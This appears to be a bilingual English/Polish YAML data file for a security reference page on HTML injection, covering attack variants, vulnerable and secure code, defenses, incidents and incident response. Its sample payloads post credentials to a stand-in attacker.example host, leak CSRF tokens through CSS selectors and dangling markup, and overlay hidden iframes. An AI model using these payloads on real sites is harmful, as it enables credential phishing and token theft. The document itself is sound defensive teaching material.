@@ -1,0 +1,401 @@
+meta:
+  id: htmlinjection
+  threatId: '1.24'
+  severity: High
+  color: '#0d9488'
+  colorRgb: 13,148,136
+  cwe: CWE-79
+  cvss: '6.1'
+  standard: OWASP A03:2021
+hero:
+  titleMain: 'HTML '
+  titleGrad: Injection
+  titleTail: ''
+  topbar: HTML Injection
+  lead:
+    en: 'Markup lands in a response and renders — but no script executes. That''s the textbook boundary separating this from XSS, and all three independent research passes agree it''s a genuinely blurry one: MITRE folds both under CWE-79, most bug-bounty programs triage pure HTML injection as low/informational, and researchers routinely escalate it straight into XSS to maximize impact, which erases the distinction from the incident record. Content spoofing, phishing overlays, meta-refresh redirects, and scriptless CSS/dangling-markup exfiltration are all real, demonstrated impact without a single <script> tag.'
+    pl: 'Znacznik trafia do odpowiedzi i się renderuje — ale żaden skrypt się nie wykonuje. To podręcznikowa granica oddzielająca to od XSS, a wszystkie trzy niezależne badania zgadzają się że jest ona naprawdę rozmyta: MITRE zwija oba pod CWE-79, większość programów bug bounty traktuje czyste HTML injection jako niskie/informacyjne, a badacze rutynowo eskalują je wprost do XSS by zmaksymalizować wpływ, co zaciera to rozróżnienie w rejestrze incydentów. Content spoofing, nakładki phishingowe, przekierowania meta-refresh i bezskryptowa eksfiltracja przez CSS/dangling-markup to wszystko realny, udowodniony wpływ bez ani jednego tagu <script>.'
+  metrics:
+  - k: CWE-79
+    v:
+      en: Weakness ID (parent, disputed sub-mapping)
+      pl: ID słabości (nadrzędne, sporne pod-mapowanie)
+  - k: '6.1'
+    v: CVSS · Medium (typical reflected case)
+  - k: A03:2021
+    v: OWASP Top 10
+  - k: '7'
+    v:
+      en: Attack variants
+      pl: Warianty ataku
+  sources:
+  - label: OWASP A03:2021
+    url: https://owasp.org/Top10/A03_2021-Injection/
+  - label: CWE-79 (MITRE)
+    url: https://cwe.mitre.org/data/definitions/79.html
+  - label: CWE-451 (MITRE) — UI Misrepresentation
+    url: https://cwe.mitre.org/data/definitions/451.html
+  - label: PortSwigger Research — Blind CSS Exfiltration
+    url: https://portswigger.net/research/blind-css-exfiltration
+sectionOrder:
+- overview
+- types
+- code
+- method
+- defense
+- incidents
+- tools
+- compliance
+- ir
+- sources
+nav:
+- id: overview
+  en: Overview
+  pl: Przegląd
+- id: types
+  en: Attack types
+  pl: Typy ataków
+- id: code
+  en: Vuln vs Secure
+  pl: Podatny vs Bezpieczny
+- id: method
+  en: Methodology
+  pl: Metodyka
+- id: defense
+  en: Defense layers
+  pl: Warstwy obrony
+- id: incidents
+  en: Real incidents
+  pl: Incydenty
+- id: tools
+  en: SAST / DAST
+  pl: SAST / DAST
+- id: compliance
+  en: Compliance
+  pl: Zgodność
+- id: ir
+  en: Incident response
+  pl: Reagowanie
+- id: sources
+  en: Sources
+  pl: Źródła
+sections:
+  attacks:
+    title:
+      en: Attack types
+      pl: Typy ataków
+    lead:
+      en: Seven ways unescaped markup causes real harm without a single line of script executing.
+      pl: Siedem sposobów, w jakie nieoescapowany znacznik wyrządza realną szkodę bez wykonania choćby jednej linii skryptu.
+    items:
+    - name: Content spoofing / defacement
+      sev: medium
+      description:
+        en: Injected tags (headings, images, styled blocks) rewrite what a legitimate page visually shows, undermining trust or spreading disinformation without touching any script context.
+        pl: Wstrzyknięte tagi (nagłówki, obrazy, stylizowane bloki) przepisują to co legalna strona wizualnie pokazuje, podważając zaufanie lub szerząc dezinformację bez dotykania jakiegokolwiek kontekstu skryptu.
+      payload: <h1>Account suspended — call 1-800-555-0100 to verify</h1>
+    - name: Phishing via fake login form
+      sev: high
+      description:
+        en: An injected <form> posting to an attacker-controlled endpoint, styled to match the real page, harvests credentials directly from a URL on the legitimate domain — no script required, which is what makes CWE-451 (UI Misrepresentation) the more precise mapping for this variant's actual impact.
+        pl: Wstrzyknięty <form> wysyłający dane do endpointu kontrolowanego przez atakującego, stylizowany na wzór prawdziwej strony, zbiera dane logowania bezpośrednio z adresu URL na legalnej domenie — bez potrzeby skryptu, co czyni CWE-451 (UI Misrepresentation) precyzyjniejszym mapowaniem dla faktycznego wpływu tego wariantu.
+      payload: <form action="https://attacker.example/collect" method="post"><input name="user"><input name="pass" type="password"><button>Sign in</button></form>
+    - name: Meta-refresh redirect
+      sev: medium
+      description:
+        en: 'A <meta http-equiv="refresh"> tag silently redirects the victim to an attacker-controlled site after a short delay, exploited on a real Snapchat asset via an unsanitized search parameter (HackerOne #2018615, 2023).'
+        pl: 'Tag <meta http-equiv="refresh"> po krótkim opóźnieniu po cichu przekierowuje ofiarę na stronę kontrolowaną przez atakującego, wykorzystane na realnym zasobie Snapchat przez nieoczyszczony parametr wyszukiwania (HackerOne #2018615, 2023).'
+      payload: <meta http-equiv="refresh" content="1; url=https://attacker.example/login">
+    - name: Iframe framing / clickjacking-adjacent
+      sev: medium
+      description:
+        en: An injected <iframe> overlays or embeds attacker content inside the trusted page context, blurring into classic clickjacking territory (CWE-1021, Improper Restriction of Rendered UI Layers).
+        pl: Wstrzyknięty <iframe> nakłada lub osadza treść atakującego wewnątrz zaufanego kontekstu strony, zlewając się z klasycznym terytorium clickjackingu (CWE-1021, Improper Restriction of Rendered UI Layers).
+      payload: <iframe src="https://attacker.example/fake-consent" style="position:fixed;inset:0;opacity:0.01;z-index:999"></iframe>
+    - name: CSS injection (blind data exfiltration)
+      sev: high
+      description:
+        en: Injected <style>/attribute selectors combined with background-image or font-face requests exfiltrate character-by-character page content (e.g. CSRF tokens) purely through CSS — no JavaScript at all. Demonstrated as a general technique in PortSwigger's own 2023 "Blind CSS Exfiltration" research, and separately used to steal OAuth tokens in a published bug-bounty writeup.
+        pl: Wstrzyknięte selektory <style>/atrybutów połączone z żądaniami background-image lub font-face eksfiltrują zawartość strony znak po znaku (np. tokeny CSRF) czysto przez CSS — bez żadnego JavaScriptu. Zademonstrowane jako ogólna technika w badaniu PortSwigger "Blind CSS Exfiltration" z 2023, i osobno użyte do kradzieży tokenów OAuth w opublikowanym opisie bug-bounty.
+      payload: <style>input[name=csrf][value^="a"]{background:url(//attacker.example/log?c=a)}</style>
+    - name: HTML injection in HTML email
+      sev: medium
+      description:
+        en: 'User-controlled fields (display name, invite message) get embedded unescaped into an HTML email template sent by the application itself — the injected markup executes in the recipient''s mail client render context, not the web app. Multiple real disclosed reports exist for this exact pattern (e.g. Slack HackerOne #1461194, HackerOne''s own program #1581499), though only titles/existence were independently confirmed — HackerOne''s report bodies are JS-rendered and did not return full text on direct fetch.'
+        pl: 'Pola kontrolowane przez użytkownika (nazwa wyświetlana, wiadomość zaproszenia) trafiają nieoescapowane do szablonu emaila HTML wysyłanego przez samą aplikację — wstrzyknięty znacznik wykonuje się w kontekście renderowania klienta pocztowego odbiorcy, nie aplikacji webowej. Istnieje wiele realnych ujawnionych zgłoszeń dla dokładnie tego wzorca (np. Slack HackerOne #1461194, własny program HackerOne #1581499), choć niezależnie potwierdzono jedynie tytuły/istnienie — treści zgłoszeń HackerOne są renderowane przez JS i nie zwróciły pełnego tekstu przy bezpośrednim pobraniu.'
+      payload: <!-- invite "display name" field --><img src=x onerror=alert(1) style="display:none"><b>Free gift card</b> — click here
+    - name: Dangling markup injection
+      sev: high
+      description:
+        en: An unclosed attribute (e.g. an opened src="  or href="  with no closing quote) causes the browser to greedily consume all subsequent markup as part of that attribute value up to the next quote, sending it to an attacker-controlled URL — a genuinely scriptless secret-exfiltration technique that works even under a CSP strict enough to block every script variant.
+        pl: Niezamknięty atrybut (np. otwarty src="  lub href="  bez zamykającego cudzysłowu) powoduje że przeglądarka zachłannie pochłania cały kolejny znacznik jako część wartości tego atrybutu aż do następnego cudzysłowu, wysyłając to na URL kontrolowany przez atakującego — naprawdę bezskryptowa technika eksfiltracji sekretów, która działa nawet pod CSP na tyle ścisłym by zablokować każdy wariant skryptowy.
+      payload: <img src="https://attacker.example/log?d=
+  code:
+    title:
+      en: Vulnerable vs Secure
+      pl: Podatny vs Bezpieczny
+    lead:
+      en: 'The fix is identical to XSS''s: context-aware output encoding at render time. The only difference is that here the payload never contains a script, which is exactly why "just strip <script> tags" fails this entire class outright.'
+      pl: 'Naprawa jest identyczna jak w XSS: kontekstowe kodowanie wyjścia w momencie renderowania. Jedyna różnica jest taka, że tutaj ładunek nigdy nie zawiera skryptu, co jest dokładnie powodem dla którego "po prostu usuń tagi <script>" całkowicie zawodzi w tej całej klasie.'
+    languages:
+    - label: JavaScript (DOM)
+      lang: javascript
+      vulnerable: '// VULNERABLE
+
+        document.getElementById("welcome").innerHTML = "Hello, " + userDisplayName;
+
+        // userDisplayName = ''<form action=//evil.example>'' renders a live phishing form'
+      safe: '// SECURE
+
+        document.getElementById("welcome").textContent = "Hello, " + userDisplayName;
+
+        // or, if rich HTML must be allowed: DOMPurify.sanitize(html, {ALLOWED_TAGS: [...]})'
+    - label: PHP
+      lang: php
+      vulnerable: '<?php // VULNERABLE
+
+        echo "Welcome, " . $_GET["name"];
+
+        ?>'
+      safe: '<?php // SECURE
+
+        echo "Welcome, " . htmlspecialchars($_GET["name"], ENT_QUOTES, "UTF-8");
+
+        ?>'
+    - label: Python (Jinja2)
+      lang: python
+      vulnerable: '# VULNERABLE — explicit opt-out of autoescaping
+
+        return render_template_string("Welcome, {{ name|safe }}", name=request.args["name"])'
+      safe: '# SECURE — Jinja2 autoescapes {{ name }} by default in .html templates;
+
+        # never mark untrusted input |safe
+
+        return render_template("welcome.html", name=request.args["name"])'
+  method:
+    title:
+      en: Attack methodology
+      pl: Metodyka ataku
+    lead:
+      en: How an attacker distinguishes HTML injection from a dead end, then picks the highest-impact variant the context actually allows.
+      pl: Jak atakujący odróżnia HTML injection od ślepego zaułka, po czym wybiera wariant o najwyższym wpływie na jaki faktycznie pozwala kontekst.
+    steps:
+    - title:
+        en: Map every reflected/stored input to its output context
+        pl: Zmapuj każde odbite/przechowywane wejście do jego kontekstu wyjścia
+      description:
+        en: Search fields, display names, comments, profile bios, invite messages, email templates — anywhere user text later appears in rendered HTML.
+        pl: Pola wyszukiwania, nazwy wyświetlane, komentarze, biografie profilu, wiadomości zaproszeń, szablony emaili — wszędzie gdzie tekst użytkownika później pojawia się w wyrenderowanym HTML.
+    - title:
+        en: Probe with a benign, non-script tag
+        pl: Sonda niegroźnym tagiem bez skryptu
+      description:
+        en: Send <b>test</b> or <h1>test</h1> first. If it renders bold/large rather than appearing as literal text, output is unescaped — but a script-tag filter or CSP may still block the XSS escalation, which is exactly what keeps this a distinct, still-exploitable class.
+        pl: Najpierw wyślij <b>test</b> albo <h1>test</h1>. Jeśli renderuje się pogrubione/duże zamiast pojawić się jako dosłowny tekst, wyjście jest nieoescapowane — ale filtr tagów script lub CSP wciąż może blokować eskalację do XSS, co jest dokładnie tym co utrzymuje to jako odrębną, wciąż eksploatowalną klasę.
+    - title:
+        en: Fingerprint the filter's exact boundary
+        pl: Rozpoznaj dokładną granicę filtra
+      description:
+        en: 'Test which tags/attributes survive: <script> blocked but <iframe> allowed? on* handlers stripped but <style> passes through? This boundary determines which of the seven variants is actually reachable.'
+        pl: 'Testuj które tagi/atrybuty przechodzą: <script> zablokowany ale <iframe> dozwolony? handlery on* usunięte ale <style> przechodzi? Ta granica określa który z siedmiu wariantów jest faktycznie osiągalny.'
+    - title:
+        en: Escalate to the highest-impact reachable variant
+        pl: Eskaluj do osiągalnego wariantu o najwyższym wpływie
+      description:
+        en: Prefer a credential-harvesting form or CSS-based exfiltration over mere defacement when both are reachable; try escalating into full script execution first since it strictly dominates every HTML-only variant if the filter allows it.
+        pl: Preferuj formularz zbierający dane logowania lub eksfiltrację przez CSS ponad zwykłe zniszczenie treści, gdy oba są osiągalne; najpierw spróbuj eskalacji do pełnego wykonania skryptu, bo to ściśle dominuje nad każdym wariantem tylko-HTML, jeśli filtr na to pozwala.
+    - title:
+        en: Document impact precisely for triage
+        pl: Precyzyjnie udokumentuj wpływ do triażu
+      description:
+        en: Bug-bounty programs frequently downgrade pure HTML injection to low/informational — a working phishing-form or CSS-exfiltration PoC materially changes that triage outcome versus a bare defacement screenshot.
+        pl: Programy bug-bounty często obniżają czyste HTML injection do niskiego/informacyjnego — działający PoC formularza phishingowego lub eksfiltracji CSS materialnie zmienia ten wynik triażu w porównaniu do gołego zrzutu ekranu ze zniszczoną treścią.
+  defenses:
+    title:
+      en: Defense layers, ranked
+      pl: Warstwy obrony wg skuteczności
+    lead:
+      en: Identical primary fix to XSS — context-aware encoding — because the root cause (unescaped output) is identical; only the exploitability of a single sub-variant (script execution) differs.
+      pl: Identyczna podstawowa naprawa jak w XSS — kodowanie kontekstowe — bo przyczyna źródłowa (nieoescapowane wyjście) jest identyczna; różni się tylko eksploatowalność jednego pod-wariantu (wykonanie skryptu).
+    items:
+    - rank: 1
+      eff: 95
+      kind: primary
+      label:
+        en: Context-aware output encoding
+        pl: Kontekstowe kodowanie wyjścia
+      note:
+        en: HTML-entity-encode all untrusted data at render time (htmlspecialchars, Jinja2 autoescape, React JSX). Removes the ability to inject any tag at all, closing every one of the seven variants at the root.
+        pl: Koduj encjami HTML wszystkie niezaufane dane w momencie renderowania (htmlspecialchars, autoescape Jinja2, JSX Reacta). Usuwa możliwość wstrzyknięcia jakiegokolwiek tagu, zamykając wszystkie siedem wariantów u źródła.
+    - rank: 2
+      eff: 88
+      kind: strong
+      label:
+        en: Sanitization library with a strict allowlist
+        pl: Biblioteka sanityzacji z restrykcyjną allowlistą
+      note:
+        en: When users must be allowed some rich HTML (comments, bios), run it through DOMPurify or an equivalent server-side sanitizer configured with an explicit tag/attribute allowlist — never a denylist.
+        pl: Gdy użytkownicy muszą mieć dozwolony pewien bogaty HTML (komentarze, biografie), przepuść go przez DOMPurify lub równoważny sanitizer po stronie serwera skonfigurowany z jawną allowlistą tagów/atrybutów — nigdy denylistą.
+    - rank: 3
+      eff: 65
+      kind: mitigation
+      label:
+        en: Targeted CSP directives (form-action, frame-ancestors, base-uri)
+        pl: Celowane dyrektywy CSP (form-action, frame-ancestors, base-uri)
+      note:
+        en: Meaningful defense-in-depth against specific variants — form-action blocks the phishing-form's exfil target, frame-ancestors blocks framing — but does nothing against content spoofing or meta-refresh, and CSS injection can bypass CSP entirely since style isn't script.
+        pl: Sensowna obrona w głąb przeciw konkretnym wariantom — form-action blokuje cel eksfiltracji formularza phishingowego, frame-ancestors blokuje framing — ale nic nie robi przeciw content spoofing ani meta-refresh, a wstrzyknięcie CSS może całkowicie ominąć CSP, bo styl to nie skrypt.
+    - rank: 4
+      eff: 55
+      kind: mitigation
+      label:
+        en: Input validation / tag allowlisting at intake
+        pl: Walidacja wejścia / allowlista tagów przy przyjęciu
+      note:
+        en: Rejecting or stripping tags at input time helps, but is weak alone — it duplicates logic that belongs at output encoding and is routinely bypassed by encoding tricks (double-encoding, unusual whitespace, case variation).
+        pl: Odrzucanie lub usuwanie tagów przy wejściu pomaga, ale samo w sobie jest słabe — duplikuje logikę która należy do kodowania wyjścia i jest rutynowo omijane sztuczkami kodowania (podwójne kodowanie, nietypowe białe znaki, wariacje wielkości liter).
+    - rank: 5
+      eff: 20
+      kind: weak
+      label:
+        en: '"Just block <script> tags"'
+        pl: '"Po prostu zablokuj tagi <script>"'
+      note:
+        en: 'The single most common naive fix, and explicitly why HTML injection remains a distinct, exploitable class even on "XSS-safe" applications: it leaves forms, iframes, meta-refresh, CSS injection, and dangling markup completely open, since none of them require a <script> tag at all.'
+        pl: 'Najczęstsza naiwna naprawa, i wprost powód dla którego HTML injection pozostaje odrębną, eksploatowalną klasą nawet na aplikacjach "bezpiecznych od XSS": zostawia formularze, iframe, meta-refresh, wstrzyknięcie CSS i dangling markup całkowicie otwarte, bo żaden z nich w ogóle nie wymaga tagu <script>.'
+  incidents:
+    title:
+      en: Real-world incidents
+      pl: Rzeczywiste incydenty
+    lead:
+      en: No marquee breach exists for this class — bug-bounty triage and the routine escalation into full XSS mean pure HTML injection rarely gets its own headline. The strongest, most technically solid evidence is PortSwigger's own CSS-exfiltration research; the other two are a verified low-severity disclosed report and a real CVE.
+      pl: Nie istnieje flagowy wyciek dla tej klasy — triaż bug-bounty i rutynowa eskalacja do pełnego XSS oznaczają że czyste HTML injection rzadko dostaje własny nagłówek. Najsilniejszym, najbardziej technicznie solidnym dowodem jest własne badanie PortSwigger nad eksfiltracją przez CSS; pozostałe dwa to zweryfikowane zgłoszenie o niskiej istotności i prawdziwe CVE.
+    items:
+    - org: PortSwigger Research (Gareth Heyes)
+      year: 2023
+      impact: Blind CSS Exfiltration technique
+      cost: Proof-of-concept research, no direct breach
+      description:
+        en: 'Published 5 December 2023: demonstrates exfiltrating arbitrary page text character-by-character purely via injected CSS attribute selectors and font/background requests — no JavaScript execution needed at all, working even against a script-blocking CSP.'
+        pl: 'Opublikowane 5 grudnia 2023: demonstruje eksfiltrację dowolnego tekstu strony znak po znaku czysto przez wstrzyknięte selektory atrybutów CSS oraz żądania font/background — bez potrzeby wykonania jakiegokolwiek JavaScriptu, działające nawet przeciw CSP blokującemu skrypty.'
+    - org: Snapchat (newsroom.snap.com)
+      year: 2023
+      impact: 'HackerOne report #2018615, Low severity, $50 bounty'
+      cost: Meta-refresh redirect via unsanitized search parameter
+      description:
+        en: 'Reported 8 June 2023, disclosed 14 August 2023: the search?q= parameter reflected input unescaped, letting an attacker craft a URL on the legitimate newsroom.snap.com domain that silently redirected visitors via <meta http-equiv="refresh">. Confirmed patched on retest.'
+        pl: 'Zgłoszone 8 czerwca 2023, ujawnione 14 sierpnia 2023: parametr search?q= odbijał wejście nieoescapowane, pozwalając atakującemu stworzyć URL na legalnej domenie newsroom.snap.com który po cichu przekierowywał odwiedzających przez <meta http-equiv="refresh">. Potwierdzono naprawę przy retescie.'
+    - org: Hibernate Validator (Java ecosystem)
+      year: 2023
+      impact: CVE-2023-1932, CVSS 6.1, CWE-1286
+      cost: SafeHtmlValidator bypass affecting all consumers of @SafeHtml
+      description:
+        en: The @SafeHtml annotation's isValid check could be bypassed by omitting a tag's closing angle bracket — browsers still render the malformed markup, so applications trusting @SafeHtml validation as their HTML-injection defense were left exposed. Fixed in 6.2.0; @SafeHtml itself was later deprecated in favor of dedicated sanitization libraries.
+        pl: Kontrola isValid adnotacji @SafeHtml mogła być ominięta przez pominięcie zamykającego znaku „większe niż" tagu — przeglądarki wciąż renderują zniekształcony znacznik, więc aplikacje ufające walidacji @SafeHtml jako obronie przed HTML injection zostały narażone. Naprawione w 6.2.0; @SafeHtml zostało później wycofane na rzecz dedykowanych bibliotek sanityzacji.
+    inlineSources:
+    - label: PortSwigger Research — Blind CSS Exfiltration
+      url: https://portswigger.net/research/blind-css-exfiltration
+    - label: 'HackerOne #2018615 (Snapchat)'
+      url: https://hackerone.com/reports/2018615
+    - label: GHSA — CVE-2023-1932 (Hibernate Validator)
+      url: https://github.com/advisories/GHSA-x83m-pf6f-pf9g
+  tools:
+    title:
+      en: Detection tooling
+      pl: Narzędzia wykrywania
+    lead:
+      en: Mostly the same tooling as XSS detection, since the underlying sink (unescaped HTML output) is identical — the difference is manual triage of impact once a sink is found.
+      pl: Głównie te same narzędzia co przy wykrywaniu XSS, bo bazowy sink (nieoescapowane wyjście HTML) jest identyczny — różnica to ręczny triaż wpływu po znalezieniu sinka.
+    sast:
+    - - Semgrep
+      - Rules for innerHTML assignment, dangerouslySetInnerHTML, |safe/autoescape=False, echo without htmlspecialchars
+    - - CodeQL
+      - Dataflow queries tracing untrusted input to an unescaped-HTML-output sink, shared with its XSS query pack
+    - - ESLint (eslint-plugin-react)
+      - react/no-danger flags dangerouslySetInnerHTML usage for manual review
+    - - Brakeman (Ruby/Rails)
+      - Flags raw/html_safe/.html_safe! calls on untrusted data in views
+    dast:
+    - - Burp Suite
+      - Passive scanner flags reflected input rendered unescaped; manual repeater testing distinguishes which tags/attributes survive a given filter
+    - - OWASP ZAP
+      - Active scan rules for reflected HTML/attribute injection, shared with its XSS ruleset
+    - - Dalfox
+      - Fast reflection-point scanner useful for the initial "does this field render unescaped at all" probe before manual escalation
+    - - Browser DevTools
+      - Directly inspecting the rendered DOM confirms whether a payload became a live element (bold text, a form, an iframe) versus literal escaped text
+    note:
+      en: <strong>Key signal:</strong> the same unescaped-output sink that SAST/DAST tools already flag as XSS-risk — the manual step this class specifically needs is testing whether non-script tags (<form>, <iframe>, <style>, <meta>) survive a filter that blocks <script>, since automated scanners tend to stop once they confirm or deny script execution.
+      pl: <strong>Kluczowy sygnał:</strong> ten sam sink nieoescapowanego wyjścia który narzędzia SAST/DAST już oznaczają jako ryzyko XSS — ręczny krok specyficzny dla tej klasy to sprawdzenie czy tagi bez skryptu (<form>, <iframe>, <style>, <meta>) przechodzą przez filtr blokujący <script>, bo automatyczne skanery zwykle kończą po potwierdzeniu lub zaprzeczeniu wykonania skryptu.
+  compliance:
+    title:
+      en: Compliance quick-reference
+      pl: Szybka zgodność
+    lead:
+      en: 'The most nuanced mapping in this knowledge base: all three independent research passes converged on the same disputed picture rather than a clean answer, and it is documented here rather than silently resolved.'
+      pl: 'Najbardziej niuansowe mapowanie w tej bazie wiedzy: wszystkie trzy niezależne badania zbiegły się w tym samym spornym obrazie zamiast czystej odpowiedzi, i jest to udokumentowane tutaj zamiast po cichu rozstrzygnięte.'
+    items:
+    - std: CWE (MITRE)
+      items:
+      - CWE-79 — the safe, defensible primary/parent mapping (Improper Neutralization of Input During Web Page Generation)
+      - CWE-80 — commonly mislabeled onto pure HTML injection, but MITRE's own definition is specifically about script-related tags, so it is arguably not correct for genuinely non-script cases
+      - CWE-451 — UI Misrepresentation of Critical Information; the more precise mapping for content-spoofing/phishing-overlay impact
+      - CWE-1021 — Improper Restriction of Rendered UI Layers or Frames; the precise mapping for the iframe/clickjacking-adjacent variant
+      - CWE-116 — Improper Encoding or Escaping of Output; the root-cause mapping shared with every variant
+    - std: OWASP
+      items:
+      - A03:2021 — Injection (the umbrella mapping for the class as a whole)
+    inlineSources:
+    - label: CWE-79 (MITRE)
+      url: https://cwe.mitre.org/data/definitions/79.html
+    - label: CWE-80 (MITRE)
+      url: https://cwe.mitre.org/data/definitions/80.html
+    - label: CWE-451 (MITRE)
+      url: https://cwe.mitre.org/data/definitions/451.html
+    - label: CWE-1021 (MITRE)
+      url: https://cwe.mitre.org/data/definitions/1021.html
+    - label: OWASP A03:2021
+      url: https://owasp.org/Top10/A03_2021-Injection/
+  ir:
+    title:
+      en: Incident response checklist
+      pl: Lista kontrolna reagowania
+    lead:
+      en: If active exploitation of an HTML injection point is confirmed, work this list top to bottom.
+      pl: Po potwierdzeniu aktywnej eksploatacji punktu HTML injection, przejdź tę listę od góry.
+    steps:
+    - en: Identify the exact sink and whether the filter permits script tags — this determines whether the incident is HTML-injection-only or has already escalated to XSS
+      pl: Zidentyfikuj dokładny sink i czy filtr dopuszcza tagi script — to determinuje czy incydent jest wyłącznie HTML injection czy już eskalował do XSS
+    - en: Check whether any injected form, meta-refresh, or iframe was live and could have harvested credentials or redirected users — treat any exposed session as potentially phished
+      pl: Sprawdź czy jakikolwiek wstrzyknięty formularz, meta-refresh lub iframe był aktywny i mógł zbierać dane logowania lub przekierowywać użytkowników — traktuj każdą narażoną sesję jako potencjalnie wyłudzoną
+    - en: Review outbound request logs for CSS-triggered background-image/font-face fetches to unfamiliar hosts — the signature of blind CSS exfiltration
+      pl: Przejrzyj logi żądań wychodzących pod kątem wywołanych przez CSS pobrań background-image/font-face do nieznanych hostów — sygnatura ślepej eksfiltracji przez CSS
+    - en: Patch the root cause with context-aware output encoding, not a tag denylist — a denylist fix here is the single most common recurrence cause
+      pl: Napraw przyczynę źródłową kontekstowym kodowaniem wyjścia, nie denylistą tagów — naprawa denylistą jest tutaj najczęstszą przyczyną nawrotu
+    - en: If the injection point is an HTML email template, audit every other user-controlled field feeding that same template, not just the one exploited
+      pl: Jeśli punktem wstrzyknięcia jest szablon emaila HTML, przeaudytuj każde inne pole kontrolowane przez użytkownika zasilające ten sam szablon, nie tylko to które zostało wykorzystane
+    - en: Notify affected users if a phishing form or credential-harvesting page was confirmed live, per applicable disclosure obligations
+      pl: Powiadom dotkniętych użytkowników jeśli potwierdzono aktywny formularz phishingowy lub stronę zbierającą dane logowania, zgodnie z obowiązującymi wymogami ujawnienia
+  sources:
+    title:
+      en: Sources
+      pl: Źródła
+    items:
+    - label: OWASP A03:2021 Injection
+      url: https://owasp.org/Top10/A03_2021-Injection/
+    - label: CWE-79 (MITRE)
+      url: https://cwe.mitre.org/data/definitions/79.html
+    - label: CWE-80 (MITRE)
+      url: https://cwe.mitre.org/data/definitions/80.html
+    - label: CWE-451 (MITRE)
+      url: https://cwe.mitre.org/data/definitions/451.html
+    - label: CWE-1021 (MITRE)
+      url: https://cwe.mitre.org/data/definitions/1021.html
+    - label: CWE-116 (MITRE)
+      url: https://cwe.mitre.org/data/definitions/116.html
+    - label: PortSwigger Research — Blind CSS Exfiltration
+      url: https://portswigger.net/research/blind-css-exfiltration
+    - label: 'HackerOne #2018615 (Snapchat)'
+      url: https://hackerone.com/reports/2018615
+    - label: GHSA — CVE-2023-1932 (Hibernate Validator)
+      url: https://github.com/advisories/GHSA-x83m-pf6f-pf9g
